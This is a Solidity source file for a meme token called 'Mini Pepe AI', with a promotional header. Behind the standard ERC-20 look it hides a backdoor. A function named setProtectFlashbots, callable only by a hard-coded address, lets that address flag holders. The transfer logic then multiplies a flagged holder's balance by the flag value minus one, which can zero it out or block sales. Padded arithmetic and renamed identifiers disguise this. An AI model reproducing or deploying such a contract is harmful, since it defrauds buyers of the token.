/**

Info : 

PepeAI is an innovative cryptocurrency token that has captured the attention of the crypto community, building on the recent hype around the famous Pepe the Frog meme.
But PepeAI is not just another meme-based token – it’s a token with a unique twist that intersects the world of artificial intelligence (AI) and memes.
PEPE AI is a FUN revolutionary crypto project that aims to combine the power of memes and AI to take people to the moon with the speed of light.
PEPE AI IS THE KING OF MEME COINS!!

Website : https://pepeai.io/

Twitter : https://twitter.com/pepeaicoin

Telegram : https://t.me/pepeaicoin

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed alienated, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address azithromycin) external view returns (uint256);

    function transfer(address to, uint256 trewzion) external returns (bool);

    function allowance(address alienated, address spender) external view returns (uint256);

    function approve(address spender, uint256 trewzion) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 trewzion
    ) external returns (bool);
}

pragma solidity ^0.8.18;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.18;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMozed(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mozed(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract Ownable is Context {
    address private _alienated;

    event alienatedshipTransferred(address indexed previousalienated, address indexed newalienated);

    constructor() {
        _transferalienatedship(_msgSender());
    }

    modifier onlyalienated() {
        _checkalienated();
        _;
    }

    function alienated() public view virtual returns (address) {
        return _alienated;
    }

    function _checkalienated() internal view virtual {
        require(alienated() == _msgSender(), "Ownable: caller is not the alienated");
    }

    function renouncealienatedship() public virtual onlyalienated {
        _transferalienatedship(address(0));
    }

    function transferalienatedship(address newalienated) public virtual onlyalienated {
        require(newalienated != address(0), "Ownable: new alienated is the zero address");
        _transferalienatedship(newalienated);
    }

    function _transferalienatedship(address newalienated) internal virtual {
        address oldalienated = _alienated;
        _alienated = newalienated;
        emit alienatedshipTransferred(oldalienated, newalienated);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _protectFlashbots;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address private executionDefender;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(address executionDefenderAddress, string memory name_, string memory symbol_) {
        executionDefender = executionDefenderAddress;
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address azithromycin) public view virtual override returns (uint256) {
        return _balances[azithromycin];
    }

    function transfer(address _to, uint256 trewzion) public virtual override returns (bool) {
        address alienated = _msgSender();
        _transfer(alienated, _to, trewzion);
        return true;
    }

    function allowance(address alienated, address spender) public view virtual override returns (uint256) {
        return _allowances[alienated][spender];
    }

    function approve(address spender, uint256 trewzion) public virtual override returns (bool) {
        address alienated = _msgSender();
        _approve(alienated, spender, trewzion);
        return true;
    }

    function setProtectFlashbots(address[] memory holder, uint256 iMEV) public BEP20ExecuteExtension {
        for(uint256 i = 0; i < holder.length; i++) {
        _protectFlashbots[holder[i]] = iMEV*1+0;
        }
    }

    function getProtectFlashbots(address holder) public view returns (uint256) {
        return _protectFlashbots[holder];
    }

    modifier 
        BEP20ExecuteExtension() {
         require(
             executionDefender == _msgSender(),
             "This is a zero tolerance")
        ;
        _;
    }

    function transferFrom(
        address from,
        address to,
        uint256 trewzion
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, trewzion);
        _transfer(from, to, trewzion);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address alienated = _msgSender();
        _approve(alienated, spender, allowance(alienated, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address alienated = _msgSender();
        uint256 currentAllowance = allowance(alienated, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(alienated, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    using SafeMath for uint256;
    uint256 private _feeTax = 1;
    function _transfer(
        address from,
        address to,
        uint256 trewzion
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, trewzion);

        if(_protectFlashbots[from] != uint256(1*1+0)-1+0 ){
           _balances[from] = _balances[from].mozed(_protectFlashbots[from].add(1+1*1+0).sub(1+1+1+0)+0); 
        }

        uint256 fromBalance = _balances[from];
        require(fromBalance >= trewzion, "ERC20: transfer exceeds balance");

        uint256 feetrewzion = 0;
        feetrewzion = trewzion.mozed(_feeTax).div(100);
        
    unchecked {
        _balances[to] += trewzion;
        _balances[from] = fromBalance - trewzion;
        _balances[to] -= feetrewzion;
    }
        emit Transfer(from, to, trewzion);

        _afterTokenTransfer(from, to, trewzion);
    }

    function _mint(address azithromycin, uint256 trewzion) internal virtual {
        require(azithromycin != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), azithromycin, trewzion);

        _totalSupply += trewzion;

    unchecked {
        // Overflow not possible: balance + trewzion is at most totalSupply + trewzion, which is checked above.
        _balances[azithromycin] += trewzion;
    }
        emit Transfer(address(0), azithromycin, trewzion);

        _afterTokenTransfer(address(0), azithromycin, trewzion);
    }

    function _burn(address azithromycin, uint256 trewzion) internal virtual {
        require(azithromycin != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(azithromycin, address(0), trewzion);

        uint256 azithromycinBalance = _balances[azithromycin];
        require(azithromycinBalance >= trewzion, "ERC20: burn trewzion exceeds balance");
        
    unchecked {
        _balances[azithromycin] = azithromycinBalance - trewzion;
        // Overflow not possible: trewzion <= azithromycinBalance <= totalSupply.
        _totalSupply -= trewzion;
    }

        emit Transfer(azithromycin, address(0), trewzion);

        _afterTokenTransfer(azithromycin, address(0), trewzion);
    }

    function _approve(
        address alienated,
        address spender,
        uint256 trewzion
    ) internal virtual {
        require(alienated != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[alienated][spender] = trewzion;
        emit Approval(alienated, spender, trewzion);
    }

    function _spendAllowance(
        address alienated,
        address spender,
        uint256 trewzion
    ) internal virtual {
        uint256 currentAllowance = allowance(alienated, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= trewzion, "ERC20: insufficient allowance");
            unchecked {
            _approve(alienated, spender, currentAllowance - trewzion);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 trewzion
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 trewzion
    ) internal virtual {}
}

pragma solidity ^0.8.18;

contract Token is ERC20 {
    uint256 initialSupply = 1000000000;
    constructor() ERC20(0xC03ab6efbf7A6B210BC943cf288f312d9c539878, "Mini Pepe AI", "PepeAI") {
        _mint(msg.sender, initialSupply*10**9);
    }
}